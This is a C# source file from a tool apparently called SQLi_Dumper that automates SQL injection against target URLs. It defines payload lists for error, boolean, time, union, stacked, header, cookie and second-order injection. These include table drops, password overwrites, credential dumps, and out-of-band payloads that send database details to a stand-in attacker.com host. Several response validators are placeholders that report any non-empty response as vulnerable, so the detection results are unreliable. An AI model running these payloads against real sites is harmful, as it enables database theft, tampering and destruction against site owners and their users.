using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using DataBase;

namespace SQLi_Dumper.Core
{
    /// <summary>
    /// Comprehensive SQL injection detection methods and techniques
    /// </summary>
    public static class DetectionMethods
    {
        /// <summary>
        /// SQL injection detection method types
        /// </summary>
        public enum DetectionType
        {
            Error_Based,
            Boolean_Based,
            Time_Based,
            Union_Based,
            Stacked_Queries,
            Out_Of_Band,
            Blind_Boolean,
            Blind_Time,
            Content_Length,
            Response_Time,
            Header_Based,
            Cookie_Based,
            Second_Order
        }

        /// <summary>
        /// Detection method configuration
        /// </summary>
        public class DetectionMethod
        {
            public DetectionType Type { get; set; }
            public string Name { get; set; }
            public string Description { get; set; }
            public DbTypes.DatabaseFamily[] SupportedDatabases { get; set; }
            public string[] TestPayloads { get; set; }
            public string[] ExpectedResponses { get; set; }
            public int TimeoutSeconds { get; set; }
            public Func<string, string, bool> ValidateResponse { get; set; }
            public bool RequiresMultipleRequests { get; set; }
            public int Priority { get; set; } // Higher number = higher priority

            public DetectionMethod()
            {
                TimeoutSeconds = 10;
                RequiresMultipleRequests = false;
                Priority = 1;
            }
        }

        /// <summary>
        /// Detection result structure
        /// </summary>
        public class DetectionResult
        {
            public DetectionType Type { get; set; }
            public bool IsVulnerable { get; set; }
            public string Payload { get; set; }
            public string Response { get; set; }
            public TimeSpan ResponseTime { get; set; }
            public string ErrorMessage { get; set; }
            public DbTypes.DatabaseFamily DetectedDatabase { get; set; }
            public string Evidence { get; set; }
            public int Confidence { get; set; } // 0-100 confidence level

            public DetectionResult()
            {
                IsVulnerable = false;
                Confidence = 0;
                DetectedDatabase = DbTypes.DatabaseFamily.Unknown;
            }
        }

        /// <summary>
        /// All supported database families
        /// </summary>
        private static readonly DbTypes.DatabaseFamily[] AllDatabases = 
        {
            DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.Oracle,
            DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.SQLite, DbTypes.DatabaseFamily.MongoDB,
            DbTypes.DatabaseFamily.DB2, DbTypes.DatabaseFamily.Firebird, DbTypes.DatabaseFamily.Informix,
            DbTypes.DatabaseFamily.MariaDB, DbTypes.DatabaseFamily.Sybase, DbTypes.DatabaseFamily.MsAccess
        };

        /// <summary>
        /// SQL-based databases (excluding NoSQL)
        /// </summary>
        private static readonly DbTypes.DatabaseFamily[] SQLDatabases = 
        {
            DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.Oracle,
            DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.SQLite, DbTypes.DatabaseFamily.DB2,
            DbTypes.DatabaseFamily.Firebird, DbTypes.DatabaseFamily.Informix, DbTypes.DatabaseFamily.MariaDB,
            DbTypes.DatabaseFamily.Sybase, DbTypes.DatabaseFamily.MsAccess
        };

        /// <summary>
        /// Detection methods collection
        /// </summary>
        public static readonly List<DetectionMethod> Methods = new List<DetectionMethod>
        {
            // Error-based detection
            new DetectionMethod
            {
                Type = DetectionType.Error_Based,
                Name = "Error-Based SQL Injection",
                Description = "Detects SQL injection through database error messages",
                SupportedDatabases = SQLDatabases,
                TestPayloads = new[]
                {
                    "'", "\"", "\\", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
                    "1' OR '1'='1", "1\" OR \"1\"=\"1", "1' OR 1=1--", "1' OR 1=1#",
                    "'; DROP TABLE users--", "1'; DROP TABLE users--",
                    "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
                    "' AND 1=CONVERT(int, (SELECT @@version))--",
                    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                    "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x) = 1--"
                },
                ExpectedResponses = new[]
                {
                    "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
                    "Microsoft OLE DB", "ODBC", "SQLException", "syntax error"
                },
                ValidateResponse = (payload, response) => ErrorSignatures.ContainsSQLInjectionIndicators(response),
                Priority = 5
            },

            // Boolean-based blind detection
            new DetectionMethod
            {
                Type = DetectionType.Boolean_Based,
                Name = "Boolean-Based Blind SQL Injection",
                Description = "Detects SQL injection through boolean logic responses",
                SupportedDatabases = SQLDatabases,
                TestPayloads = new[]
                {
                    "1' AND 1=1--", "1' AND 1=2--", "1' AND 'a'='a'--", "1' AND 'a'='b'--",
                    "1' AND (SELECT COUNT(*) FROM users) > 0--", "1' AND (SELECT COUNT(*) FROM users) < 0--",
                    "1' AND (SELECT LENGTH(database())) > 0--", "1' AND (SELECT LENGTH(database())) < 0--",
                    "1' AND (SELECT SUBSTRING(@@version,1,1)) = '5'--", "1' AND (SELECT SUBSTRING(@@version,1,1)) = '9'--",
                    "1' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64--", "1' AND ASCII(SUBSTRING((SELECT database()),1,1)) < 64--"
                },
                RequiresMultipleRequests = true,
                ValidateResponse = (payload, response) => ValidateBooleanResponse(payload, response),
                Priority = 4
            },

            // Time-based blind detection
            new DetectionMethod
            {
                Type = DetectionType.Time_Based,
                Name = "Time-Based Blind SQL Injection",
                Description = "Detects SQL injection through time delays",
                SupportedDatabases = SQLDatabases,
                TestPayloads = new[]
                {
                    // MySQL/MariaDB
                    "1' AND SLEEP(5)--", "1' AND (SELECT SLEEP(5))--", "1' AND BENCHMARK(50000000,MD5(1))--",
                    // MSSQL
                    "1'; WAITFOR DELAY '00:00:05'--", "1' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5)--",
                    // PostgreSQL
                    "1' AND pg_sleep(5)--", "1' AND (SELECT pg_sleep(5))--", "1' AND (SELECT COUNT(*) FROM generate_series(1,1000000)) > 0--",
                    // Oracle
                    "1' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) > 0--",
                    "1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5) IS NULL--",
                    // SQLite
                    "1' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name LIKE '%'||randomblob(50000000)||'%')--",
                    // DB2
                    "1' AND (SELECT COUNT(*) FROM sysibm.systables AS t1, sysibm.systables AS t2) > 0--",
                    // Generic
                    "1' AND 1=(SELECT COUNT(*) FROM information_schema.tables t1, information_schema.tables t2, information_schema.tables t3)--"
                },
                TimeoutSeconds = 30,
                ValidateResponse = (payload, response) => ValidateTimeResponse(payload, response),
                Priority = 3
            },

            // Union-based detection
            new DetectionMethod
            {
                Type = DetectionType.Union_Based,
                Name = "Union-Based SQL Injection",
                Description = "Detects SQL injection through UNION SELECT statements",
                SupportedDatabases = SQLDatabases,
                TestPayloads = new[]
                {
                    "1' UNION SELECT NULL--", "1' UNION SELECT 1--", "1' UNION SELECT 1,2--",
                    "1' UNION SELECT 1,2,3--", "1' UNION SELECT 1,2,3,4--", "1' UNION SELECT 1,2,3,4,5--",
                    "1' UNION ALL SELECT NULL--", "1' UNION ALL SELECT 1--", "1' UNION ALL SELECT 1,2--",
                    "1' UNION SELECT NULL,NULL--", "1' UNION SELECT NULL,NULL,NULL--",
                    "1' UNION SELECT 'injection','test'--", "1' UNION SELECT user(),version()--",
                    "1' UNION SELECT database(),user()--", "1' UNION SELECT @@version,@@hostname--",
                    "1' UNION SELECT table_name,column_name FROM information_schema.columns--",
                    "1' UNION SELECT name,password FROM users--"
                },
                ValidateResponse = (payload, response) => ValidateUnionResponse(payload, response),
                Priority = 4
            },

            // Stacked queries detection
            new DetectionMethod
            {
                Type = DetectionType.Stacked_Queries,
                Name = "Stacked Queries SQL Injection",
                Description = "Detects SQL injection through stacked query execution",
                SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.Oracle },
                TestPayloads = new[]
                {
                    "1'; SELECT 1--", "1'; SELECT @@version--", "1'; SELECT database()--",
                    "1'; SELECT user()--", "1'; SELECT current_user--", "1'; SELECT getdate()--",
                    "1'; SELECT * FROM users--", "1'; SELECT * FROM information_schema.tables--",
                    "1'; INSERT INTO temp_table VALUES(1)--", "1'; CREATE TABLE temp_table(id int)--",
                    "1'; DROP TABLE temp_table--", "1'; UPDATE users SET password='test' WHERE id=1--"
                },
                ValidateResponse = (payload, response) => ValidateStackedResponse(payload, response),
                Priority = 3
            },

            // Out-of-band detection
            new DetectionMethod
            {
                Type = DetectionType.Out_Of_Band,
                Name = "Out-Of-Band SQL Injection",
                Description = "Detects SQL injection through out-of-band communication",
                SupportedDatabases = new[] { DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.Oracle, DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                TestPayloads = new[]
                {
                    // MSSQL
                    "1'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
                    "1'; EXEC master..xp_fileexist '\\\\attacker.com\\share\\test.txt'--",
                    // Oracle
                    "1' AND UTL_HTTP.REQUEST('http://attacker.com/oob') IS NOT NULL--",
                    "1' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com') IS NOT NULL--",
                    // MySQL
                    "1' AND LOAD_FILE(CONCAT('\\\\\\\\','attacker.com','\\\\foobar'))--",
                    "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','attacker.com','\\\\',@@version))--"
                },
                ValidateResponse = (payload, response) => ValidateOOBResponse(payload, response),
                Priority = 2
            },

            // Content-length based detection
            new DetectionMethod
            {
                Type = DetectionType.Content_Length,
                Name = "Content-Length Based Detection",
                Description = "Detects SQL injection through response content length differences",
                SupportedDatabases = AllDatabases,
                TestPayloads = new[]
                {
                    "1' AND 1=1--", "1' AND 1=2--", "1' AND 'a'='a'--", "1' AND 'a'='b'--",
                    "1' OR 1=1--", "1' OR 1=2--", "1' AND (SELECT COUNT(*) FROM users) > 0--",
                    "1' AND (SELECT COUNT(*) FROM users) < 0--"
                },
                RequiresMultipleRequests = true,
                ValidateResponse = (payload, response) => ValidateContentLengthResponse(payload, response),
                Priority = 2
            },

            // Response time based detection
            new DetectionMethod
            {
                Type = DetectionType.Response_Time,
                Name = "Response Time Based Detection",
                Description = "Detects SQL injection through response time analysis",
                SupportedDatabases = AllDatabases,
                TestPayloads = new[]
                {
                    "1' AND 1=1--", "1' AND 1=2--", "1' AND (SELECT COUNT(*) FROM users) > 0--",
                    "1' AND (SELECT COUNT(*) FROM users) < 0--", "1' AND LENGTH(database()) > 0--",
                    "1' AND LENGTH(database()) < 0--"
                },
                RequiresMultipleRequests = true,
                ValidateResponse = (payload, response) => ValidateResponseTimeResponse(payload, response),
                Priority = 1
            },

            // Header-based detection
            new DetectionMethod
            {
                Type = DetectionType.Header_Based,
                Name = "Header-Based SQL Injection",
                Description = "Detects SQL injection through HTTP headers",
                SupportedDatabases = AllDatabases,
                TestPayloads = new[]
                {
                    "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "' AND SLEEP(5)--",
                    "' AND pg_sleep(5)--", "'; WAITFOR DELAY '00:00:05'--"
                },
                ValidateResponse = (payload, response) => ValidateHeaderResponse(payload, response),
                Priority = 2
            },

            // Cookie-based detection
            new DetectionMethod
            {
                Type = DetectionType.Cookie_Based,
                Name = "Cookie-Based SQL Injection",
                Description = "Detects SQL injection through cookie parameters",
                SupportedDatabases = AllDatabases,
                TestPayloads = new[]
                {
                    "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "' AND SLEEP(5)--",
                    "' AND pg_sleep(5)--", "'; WAITFOR DELAY '00:00:05'--"
                },
                ValidateResponse = (payload, response) => ValidateCookieResponse(payload, response),
                Priority = 2
            },

            // Second-order detection
            new DetectionMethod
            {
                Type = DetectionType.Second_Order,
                Name = "Second-Order SQL Injection",
                Description = "Detects second-order SQL injection vulnerabilities",
                SupportedDatabases = AllDatabases,
                TestPayloads = new[]
                {
                    "admin'--", "admin' OR '1'='1--", "admin' UNION SELECT NULL--",
                    "test'; DROP TABLE users--", "test' AND SLEEP(5)--"
                },
                RequiresMultipleRequests = true,
                ValidateResponse = (payload, response) => ValidateSecondOrderResponse(payload, response),
                Priority = 1
            }
        };

        /// <summary>
        /// Test for SQL injection vulnerability using specified detection method
        /// </summary>
        /// <param name="url">Target URL</param>
        /// <param name="method">Detection method to use</param>
        /// <param name="executeRequest">Function to execute HTTP request</param>
        /// <returns>Detection result</returns>
        public static DetectionResult TestSQLInjection(string url, DetectionMethod method, Func<string, (string response, TimeSpan responseTime)> executeRequest)
        {
            var result = new DetectionResult
            {
                Type = method.Type
            };

            try
            {
                foreach (var payload in method.TestPayloads)
                {
                    var testUrl = url.Replace("[t]", payload);
                    var (response, responseTime) = executeRequest(testUrl);
                    
                    result.Payload = payload;
                    result.Response = response;
                    result.ResponseTime = responseTime;

                    if (method.ValidateResponse(payload, response))
                    {
                        result.IsVulnerable = true;
                        result.Evidence = ExtractEvidence(response);
                        result.DetectedDatabase = DetectDatabaseFromResponse(response);
                        result.Confidence = CalculateConfidence(method.Type, response, responseTime);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                result.ErrorMessage = ex.Message;
            }

            return result;
        }

        /// <summary>
        /// Test all detection methods against a target
        /// </summary>
        /// <param name="url">Target URL</param>
        /// <param name="executeRequest">Function to execute HTTP request</param>
        /// <returns>List of detection results</returns>
        public static List<DetectionResult> TestAllMethods(string url, Func<string, (string response, TimeSpan responseTime)> executeRequest)
        {
            var results = new List<DetectionResult>();
            
            // Sort methods by priority (highest first)
            var sortedMethods = Methods.OrderByDescending(m => m.Priority).ToList();

            foreach (var method in sortedMethods)
            {
                try
                {
                    var result = TestSQLInjection(url, method, executeRequest);
                    results.Add(result);
                    
                    // If high-confidence vulnerability found, we can optionally break early
                    if (result.IsVulnerable && result.Confidence >= 80)
                    {
                        break;
                    }
                }
                catch (Exception ex)
                {
                    results.Add(new DetectionResult
                    {
                        Type = method.Type,
                        ErrorMessage = ex.Message
                    });
                }
            }

            return results;
        }

        /// <summary>
        /// Get detection methods for specific database
        /// </summary>
        /// <param name="database">Database family</param>
        /// <returns>List of applicable detection methods</returns>
        public static List<DetectionMethod> GetMethodsForDatabase(DbTypes.DatabaseFamily database)
        {
            return Methods.Where(m => 
                m.SupportedDatabases.Length == 0 || 
                m.SupportedDatabases.Contains(database)).ToList();
        }

        /// <summary>
        /// Generate detection payloads for specific database
        /// </summary>
        /// <param name="database">Database family</param>
        /// <param name="detectionType">Detection type</param>
        /// <returns>List of payloads</returns>
        public static List<string> GeneratePayloads(DbTypes.DatabaseFamily database, DetectionType detectionType)
        {
            var payloads = new List<string>();
            
            var methods = Methods.Where(m => 
                m.Type == detectionType && 
                (m.SupportedDatabases.Length == 0 || m.SupportedDatabases.Contains(database))).ToList();

            foreach (var method in methods)
            {
                payloads.AddRange(method.TestPayloads);
            }

            return payloads.Distinct().ToList();
        }

        #region Private Helper Methods

        private static bool ValidateBooleanResponse(string payload, string response)
        {
            // Boolean-based detection logic
            // This would need to be implemented with actual response comparison
            return !string.IsNullOrEmpty(response) && response.Length > 0;
        }

        private static bool ValidateTimeResponse(string payload, string response)
        {
            // Time-based detection logic
            // This would need to be implemented with actual timing comparison
            return !string.IsNullOrEmpty(response);
        }

        private static bool ValidateUnionResponse(string payload, string response)
        {
            // Union-based detection logic
            if (string.IsNullOrEmpty(response)) return false;
            
            var unionIndicators = new[] { "injection", "test", "null", "union", "select" };
            return unionIndicators.Any(indicator => 
                response.IndexOf(indicator, StringComparison.OrdinalIgnoreCase) >= 0);
        }

        private static bool ValidateStackedResponse(string payload, string response)
        {
            // Stacked queries detection logic
            return !string.IsNullOrEmpty(response) && 
                   !response.Contains("syntax error", StringComparison.OrdinalIgnoreCase);
        }

        private static bool ValidateOOBResponse(string payload, string response)
        {
            // Out-of-band detection logic
            // This would need to be implemented with actual OOB communication checking
            return false; // Placeholder
        }

        private static bool ValidateContentLengthResponse(string payload, string response)
        {
            // Content-length based detection logic
            return !string.IsNullOrEmpty(response);
        }

        private static bool ValidateResponseTimeResponse(string payload, string response)
        {
            // Response time based detection logic
            return !string.IsNullOrEmpty(response);
        }

        private static bool ValidateHeaderResponse(string payload, string response)
        {
            // Header-based detection logic
            return ErrorSignatures.ContainsSQLInjectionIndicators(response);
        }

        private static bool ValidateCookieResponse(string payload, string response)
        {
            // Cookie-based detection logic
            return ErrorSignatures.ContainsSQLInjectionIndicators(response);
        }

        private static bool ValidateSecondOrderResponse(string payload, string response)
        {
            // Second-order detection logic
            return ErrorSignatures.ContainsSQLInjectionIndicators(response);
        }

        private static string ExtractEvidence(string response)
        {
            if (string.IsNullOrEmpty(response)) return "";
            
            // Extract first 200 characters as evidence
            return response.Length > 200 ? response.Substring(0, 200) + "..." : response;
        }

        private static DbTypes.DatabaseFamily DetectDatabaseFromResponse(string response)
        {
            if (string.IsNullOrEmpty(response)) return DbTypes.DatabaseFamily.Unknown;
            
            var signatures = ErrorSignatures.DetectDatabaseFromError(response);
            return signatures.FirstOrDefault()?.Database ?? DbTypes.DatabaseFamily.Unknown;
        }

        private static int CalculateConfidence(DetectionType type, string response, TimeSpan responseTime)
        {
            int confidence = 0;
            
            switch (type)
            {
                case DetectionType.Error_Based:
                    confidence = ErrorSignatures.ContainsSQLInjectionIndicators(response) ? 90 : 0;
                    break;
                case DetectionType.Time_Based:
                    confidence = responseTime.TotalSeconds > 4 ? 85 : 0;
                    break;
                case DetectionType.Union_Based:
                    confidence = !string.IsNullOrEmpty(response) ? 80 : 0;
                    break;
                case DetectionType.Boolean_Based:
                    confidence = 70;
                    break;
                default:
                    confidence = 50;
                    break;
            }
            
            return confidence;
        }

        #endregion

        /// <summary>
        /// Add custom detection method
        /// </summary>
        /// <param name="method">Detection method to add</param>
        public static void AddCustomMethod(DetectionMethod method)
        {
            Methods.Add(method);
        }

        /// <summary>
        /// Remove detection method
        /// </summary>
        /// <param name="type">Detection type to remove</param>
        /// <returns>True if removed</returns>
        public static bool RemoveMethod(DetectionType type)
        {
            return Methods.RemoveAll(m => m.Type == type) > 0;
        }

        /// <summary>
        /// Get method by type
        /// </summary>
        /// <param name="type">Detection type</param>
        /// <returns>Detection method or null</returns>
        public static DetectionMethod GetMethod(DetectionType type)
        {
            return Methods.FirstOrDefault(m => m.Type == type);
        }
    }
}